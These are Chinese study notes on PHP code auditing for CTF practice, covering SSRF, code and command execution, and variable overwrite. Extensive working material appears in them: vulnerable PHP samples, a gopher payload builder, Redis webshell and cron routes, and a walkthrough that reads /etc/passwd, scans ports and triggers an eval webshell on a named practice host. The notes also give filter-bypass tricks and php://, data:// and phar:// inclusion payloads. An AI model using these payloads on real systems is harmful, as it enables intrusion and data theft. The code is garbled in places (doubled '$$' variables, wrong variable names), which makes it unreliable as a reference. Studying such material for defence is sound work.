# 代码审计

## PHP代码审计

- 什么是代码审计：是指对源代码进行检查，寻找代码的bug，这里主要寻找可以导致安全漏洞的bug
- 代码审计的技巧（程序的两大根本：**变量与函数**）：
  - 根据敏感的关键字**回溯**参数的传递过程
  - 查找可控变量，**正向追踪**变量的传递过程
  - 查找敏感功能点，通读功能点代码
  - 直接通读全文代码
- 自动化审计工具：Seay（PHP代码审计工具）、Cobra、Fortify SCA...

## SSRF漏洞

- SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。

### 常见后端实现

- 可以进行SSRF的常见后端实现：

  1. 使用`file_get_content()`，从用户指定的url获取图片，并把他保存下来：

  ```php
  <?php
      if(isset($_POST['url'])){
          $$content = file_get_contents($$_POST['url']);
          $filename = './images/'.rand().';img1.jpg';
          file_put_contents($$filename, $$content);
          echo $_POST['url'];
          $$img = "<img src=\"".$$filename."\"/>";
      }
  	echo $img;
  ?>
  ```

  2. 使用`fsockopen()`函数 &rarr; 这个函数会利用socket跟服务器建立TCP连接，传输用户指定的url数据数据：

  ```php
  <?php
  function GetFile($$host, $port, $$link){
      $$fp = fsockopen($host, intval($host), $errno, $$errstr, 30);
      if(!$$fp) echo "$errstr (erro number $$errno) \n";
      else{
          $$out = "GET $$link HTTP/1.1\r\n";
          $$out .= "HOST: $$host\r\n";
          $out .= "Connection: Close\r\n\r\n";
          $out .= "\r\n";
          fwrite($$fp, $$out);
          $contents='';
          while(!feof($$fp)) $content .= fgets($$fp, 1024);
          fclose($fp);
          return $contents;
      }
  }
  ?>
  ```

  3. 使用`curl()`获取数据：

  ```php
  <?php
      if(isset($_POST['url'])){
          $$link = $$_POST['url'];
          $curlobj = curl_init();
          curl_setopt($curlobj, CURLOPT_POST, 0);
          curl_setopt($$curlobj, CURLOPT_URL, $$link);
          curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
          $$result = curl_exec($$curlobj);
          curl_close($curlobj);
          
          $filename = './curled/'.rand().'.txt';
          file_put_contents($$filename, $$result);
          echo $result;
      }
  ?>
  ```

- 总结：高危函数：`file_get_contents()`、`fsockopen()`、`curl_exec()`。区别：
  1. 大部分php不会打开fopen的gopher wrapper
  2. file_get_contents的gopher协议不能URLencode
  3. curl_exec()默认不跟踪跳转
  4. file_get_contents支持php://input协议

### SSRF利用

1. 利用curl自带的协议进行攻击（http://php.net/manual/en/wrappers.php）
2. 利用SSRF攻击本地服务
   - **fastcgi**：https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html
3. 攻击数据库&缓存：
   1. Redis &rarr; 六种利用方式：（1）保存到www目录，创建webshell；（2）创建SSH authotrized_keys文件；（3）写计划任务（/var/spool/cron/ & /etc/cron.d/）；（4）slave of 8.8.8.8 主从模式利用；（5）写入到/etc/profile.d/用户环境变量；（6）开启AOF持久化纯文本记录appendfilename。
   2. Memcached：利用内存中的数据，读取管理员的Session，修改adminid。
   3. CounchDB：能够发起SSRF请求，HTTP /_replicate API

- *P.S.*：gopher转换规则实例（gopher协议使用方法：`gopher://ip:port/payload`）：

```python
#coding:utf-8
import sys
exp = ''
with open(sys.argv[1]) as f:
	for line in f.readlines():
		if line[0] in '><+': # 以"<>+"开头的行不计入计算
		# 以<>开头的表示请求和返回的时间，如果前三个字符是+OK表示返回的字符串
			continue
		elif line == '\x0a': # 如果该行只有一个0x0a字符
			exp = exp + '%0a' # 空白行替换为%0a
		elif line[-3:-1] == r'\r': # 判该行的倒数第3到倒数第2位是否为r'\r'
			if len(line) == 3: # 如果该行的长度为3，即上一步判断的为全部的内容
				exp = exp + '%0a%0d%0a'
             else:
                  line = line.replace(r'\r','%0d%0a')
                  line = line.replace('\n','')
                  exp = exp + line
		else:
			line = line.replace('\n','')
			exp = exp + line
```

### SSRF练习

1. 读取password所在文件：`http://oj.momomoxiaoxi.com:9090/index.php?url=file:///etc/passwd` &rarr; 一般只用于测试payload是否有效。
2. 使用dirsearch对目标进行扫描： `python dirsearch.py http://oj.momomoxiaoxi.com:9090 -e php`
3. 扫描出一个 `robots.txt` 文件，我们再用第一步的方法访问该文件 &rarr; `http://oj.momomoxiaoxi.com:9090/index.php?url=file:///var/www/html/robots.txt` &rarr; 其中 `/var/www/html/` 是Apache的根文件夹，扫描文件没有越权无法获得操作系统的根文件夹，认为Apache的入口文件夹为根文件夹
4. 在robots.txt文件中存在一个 `webshe11111111.php` 文件，我们用同样的方法访问该文件 &rarr; `view-source:http://oj.momomoxiaoxi.com:9090/index.php?url=file:///var/www/html/webshe11111111.php` 得到php源代码：

```php
<?php
$serverList = array(
    "127.0.0.1"
);
$$ip = $$_SERVER['REMOTE_ADDR'];
foreach ($$serverList as $$host) {
    if ($$ip === $$host) {
        if ((!empty($$_POST['admin'])) and $$_POST['admin'] === 'h1admin') {
            @eval($_POST['hacker']);
        } else die("You aren't admin!");
    } else die('This is webshell');
} ?>
```

5. 利用dict协议查看端口开启情况，以下为编写Python脚本：

```python
import requests

url = 'http://oj.momomoxiaoxi.com:9090/index.php?url='
defaultlen = len(requests.get(url+'dict://127.0.0.1:0/info').content)
print("defaultlen:%d"%defaultlen)

for x in range(1000):
    try:
        response = requests.get(url+'dict://127.0.0.1:%s/info'%str(x))
        if len(response.content) != defaultlen:
            print("Port %s, content: %s"%(str(x), response.content))
    except Exception as e:
        print(e)
        pass
```

6. 我们发现22端口和80端口处于开启状态，其中80端口返回400 Bad Request，我们尝试使用9090端口作为跳板攻击80端口
7. 配置本地环境：使用Apache打开两个端口进行测试，在其中一个端口配置之前抓取下来的PHP文件，并向其发送POST请求，使用FireFox抓取发送的数据包，复制进入Python即可获得以下Python脚本：

```python
import urllib.parse
from selenium import webdriver

PostHead = """\
POST /webshe11111111.php HTTP/1.1
Host: 127.0.0.1:80
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: http://127.0.0.1:9090/
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Connection: keep-alive
Upgrade-Insecure-Requests: 1

admin=h1admin&hacker=phpinfo();
"""
shellurl = "http://oj.momomoxiaoxi.com:9090/index.php?url=gopher://127.0.0.1:80/"

firstParse = urllib.parse.quote(PostHead)
new = firstParse.replace("%0A","%0D%0A")
secondParse = "_" + urllib.parse.quote(new)

getrequest = shellurl + secondParse

driver = webdriver.Chrome()
driver.get(getrequest)
```

8. 我们发现页面正常显示了phpinfo()页面，说明我们的shell反弹成功了，接下来更改eval执行代码和长度就可以得到webshell了。

- *PS其他：* 常见url编码（https://www.w3schools.com/tags/ref_urlencode.asp）：

|    Char    |  \r  |  :   |  ;   |  \n  |  %   |  =   |  &   |  ,   | space |
| :--------: | :--: | :--: | :--: | :--: | :--: | :--: | :--: | :--: | :---: |
| url-encode | %0A  | %3A  | %3B  | %0D  | %25  | %3D  | %26  | %2C  |  %20  |

### SSRF常见的绕过技巧

1. 更改IP地址写法
   - 一些开发者会通过传过来的URL参数进行正则表达式匹配来过滤内网IP，比如
     - `^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$`
     - `^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$`
     - `^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$`
   - 我们可以采用改编IP的方式进行绕过。比如地址`192.168.0.1`可以写成：
     - 八进制格式：`0300.0250.0.1`
     - 十六进制格式：`C0.A8.0.1`
     - 十进制整数格式：`3232235521`
     - 十六进制整数格式：`0xC0A80001`
2. 利用解析URL所出现的问题
   - 在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。解析不当可能导致绕过。比如：`http://www.baidu.com@192.168.0.1/` 实际上请求的是`192.168.0.1`上的内容。
3. 利用302跳转
   - 在网络上存在一个很神奇的服务：当我们访问 `http://xip.io` 这个网站的子域名时，会将子域名自动重定向到高一级的域名，比如 `http://192.168.0.1.xip.io` &rarr; `http://192.168.0.1` 。
     - 另外，内网IP有可能会被正则表达式过滤掉，我们可以通过短地址的方式来绕过。[使用网址](http://tinyurl.com)
   - 也可以自己实现一个302跳转。在自己的服务器上部署一个中转跳转文件，跳转到内网地址（127.0.0.1）（是在限制了可用协议为http(s)，但支持CURLOPT_FOLLOWLOCATION下的周转措施。
4. 通过各种非HTTP协议
   - 如果服务端程序对访问URL所采用的协议进行验证的话，我们可以通过非HTTP协议进行利用。
   - 主要有两个协议：`gopher://`协议与`file://`
5. 利用DNS Rebinding
   - 完整的攻击流程：
     1. 服务器获得URL参数，进行第一次DNS解析，获得了一个非内网的IP
     2. 对于获得的IP进行判断，发现为非黑名单IP，则通过验证
     3. 服务器对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址
     4. 由于已经绕过验证，所以服务器返回访问内网资源的结果
6. *PS*：利用浏览器：`127。0。0。1` &rarr;浏览器解析&rarr; `127.0.0.1`

### SSRF防御

- 过滤返回信息；统一错误信息；限制请求端口为HTTP常用端口（80、443、8080、8090）；黑名单内网IP，给请求域设置白名单；禁止不需要的协议；禁止请求域名的301的跳转。

## 代码执行及命令执行漏洞

- 代码注入高危函数：eval()、assert()、preg_replace()、call_user_func()...

  - eval和assert函数：这两个函数原本作用于动态代码执行：

  ```php
  <?php 
      error_reporting(0);
  	show_source(__FILE__);
      
      $$a = @$$_REQUEST['hello'];
      eval("var_dump($a);");
  ?>
  ```
  - `preg_replace()` 函数原型：`mixed preg_replace(mixed $$pattern, mixed $replace, mixed $subject [, int $limit = -1 [, int &$count]])`。当 `$pattern` 中存在 `/e` 模式修饰符时，`$$replacement` 会被看成PHP代码来执行。比如下面的程序会执行替换后的 `\\1` 的代码：

  ```php
  preg_replace("/\[(.*)\]/e", "\\1", $_GET['str']);
  ```

- 文件包含注高危函数：include()、include_once()、require()、require_once()。以及各个伪协议：

  1. `php://` 伪协议可以访问各个输入输出流。常见用法：`php://input` &rarr;

     1. 解释：`php://input` 指向原始POST数据

     2. 用法：比如以下Demo可以实现简单利用

        ```php
        // GET数据：localhost:8080/?payload=php://input
        // POST数据：Simple Use
        // 后端程序：index.php =>
        <?php echo file_get_contents($_GET['payload']); ?>
        ```

     3. 如果php.ini里面的 `allow_url_include=On(PHP < 5.30)` 就可以造成任意代码执行，在这里可以理解成远程文件包含漏洞（RFI），即POST一句话就可以执行。当head头中有 `enctype="multipart/form-data"` 时，该伪协议无效。

  2. `data://` 伪协议为数据封装器，将原本的include的文件流重定向到了用户可以控制的输入流中，就是说执行的文件包含方法包含了输入流。常见用法：`data://text/plain` &rarr; 

     1. 解释：一种不需要向其他位置寻找数据的数据协议描述方式。

     2. 用法：`data:[<mime type>][;charset=<charset>][;<encoding>],<encoded data>`

        ```php
        // payload: <?php phpinfo()
        // payload_base64: PD9waHAgcGhwaW5mbygpOw==
        // URI: localhost:8080/?payload=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
        // 后端程序：index.php =>
        <?php include($_GET['payload']);
        ```

     3. 注意：payload没有 `?>` 闭合。如果php.ini里面的 `allow_url_include=On` ，就可以造成任意代码执行。

  3. `phar://` 伪协议亦为数据封装器，php解压缩包的函数，解压的压缩包与后缀无关。

     1. 用法：`phar://压缩包/内部文件` 。比如：

        ```php
        // php.php =>
        <?php phpinfo(); ?>
        // php.php -> php.zip 放在网站根目录下
        // URI：localhost:8080/?payload=phar://php.zip/php.php
        // 后端程序：index.php =>
        <?php include($_GET['payload']);
        ```

     2. 注意：php版本需要大于5.3，压缩包格式是zip，利用url的压缩包后缀可以是任意后缀。

- 命令执行高危函数：system()、exec()、shell_exec()、passthru()、pctnl_exec()、popen()、proc_open()...

## 补充知识

### 变量覆盖

- 指的是我们可以用自定义的参数值来替换程序原有的变量值。
- 主要原因大多由函数使用不当造成的。主要有以下几个函数：extract()、Parse_str()、import_request_variables()；还有部分应用$$$$方式进行变量注册也容易导致变量覆盖。

```php
<?php
$chr = '';
if($$_POST && $$charset != 'utf-8'){
    $$chs = new Chinese('UTF-8', $$charset);
    foreach($$_POST as $key => $$value)
        $$$key = $chs->Convert($$value);
    unset($chs);
}
?>
```

### 全局变量泄露

```php
<?php
    include "flag.php";
	$$a = @$$_REQUEST['hello'];
	if(!preg_match('/^\w*$$/',$$a))
        die('ERROR');
	eval("val_dump($$$$a);");
	show_source(__FILE__);
?>
```

## ChinaZ例题讲解



